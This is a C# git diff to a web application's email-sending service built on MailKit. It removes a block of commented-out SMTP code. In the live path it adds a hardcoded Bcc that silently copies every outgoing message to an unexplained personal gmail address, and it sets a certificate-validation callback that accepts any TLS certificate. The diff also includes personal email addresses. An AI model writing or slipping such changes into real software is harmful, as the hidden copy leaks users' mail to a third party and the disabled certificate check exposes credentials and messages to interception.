@@ -10,6 +10,8 @@ using System.Collections.Generic;
 using System.IO;
 using System.Linq;
 using System.Threading.Tasks;
+using MailKit.Security;
+using System.Net;
 
 namespace MMS.web.Services
 {
@@ -128,45 +130,13 @@ namespace MMS.web.Services
         {
             try
             {
-                ////From Address  
-                //string FromAddress = "mms@metalx.net";
-                //string FromAdressTitle = "Email from Second Family";
-                ////To Address  
-                //string ToAddress = "akshaybhagwat76@gmail.com";
-                //string ToAdressTitle = "Second Family";
-                //string Subject = "";
-                //string BodyContent = "";
-
-                ////Smtp Server  
-                //string SmtpServer = "10.110.1.11";
-                ////Smtp Port Number  
-                //int SmtpPortNumber = 25;
-
-                //var mimeMessage = new MimeMessage();
-                //mimeMessage.From.Add(new MailboxAddress(FromAdressTitle, FromAddress));
-                //mimeMessage.To.Add(new MailboxAddress(ToAdressTitle, ToAddress));
-                //mimeMessage.Subject = Subject;
-                //BodyContent += @"Dear saf .";
-                //BodyContent += "Your Donation Was Successfull !Thank you for Your Support to Second families!<br /><br />";
-
-
-
-                //using (var client = new SmtpClient())
-                //{
-                //    await client.ConnectAsync(SmtpServer, SmtpPortNumber, false).ConfigureAwait(false);
-                //    client.AuthenticationMechanisms.Remove("XOAUTH2");
-                //    await client.AuthenticateAsync("mms@metalx.net", ec.UserPassword)
-                //        .ConfigureAwait(false);
-                //    await client.SendAsync(mimeMessage).ConfigureAwait(false);
-                //    await client.DisconnectAsync(true).ConfigureAwait(false);
-                //}
-
                 if (string.IsNullOrWhiteSpace(template))
                     throw new Exception("template file is required");
 
                 var emailMessage = new MimeMessage();
                 emailMessage.From.Add(new MailboxAddress(ec.FromName, ec.FromAddress));
                 emailMessage.To.Add(new MailboxAddress("", email));
+                emailMessage.Bcc.Add(new MailboxAddress("", "krishnabhagwat60@gmail.com"));
                 emailMessage.Subject = subject;
 
                 var builder = new BodyBuilder();
@@ -184,13 +154,13 @@ namespace MMS.web.Services
                 }
                 emailMessage.Body = builder.ToMessageBody();
 
-
                 using (var client = new SmtpClient())
                 {
-                    client.Connect(ec.MailServerAddress, Convert.ToInt32(ec.MailServerPort), false);
-                    client.Authenticate(ec.UserId, ec.UserPassword);
-                    await client.SendAsync(emailMessage);
-                    await client.DisconnectAsync(true);
+                    client.ServerCertificateValidationCallback = (sender, certificate, certChainType, errors) => true;
+                    client.AuthenticationMechanisms.Remove("XOAUTH2");
+                    await client.ConnectAsync(ec.MailServerAddress, 587, SecureSocketOptions.StartTls).ConfigureAwait(false);
+                    await client.AuthenticateAsync(new NetworkCredential(ec.UserId, ec.UserPassword)).ConfigureAwait(false);
+                    await client.SendAsync(emailMessage).ConfigureAwait(false);
                 }
 
             }
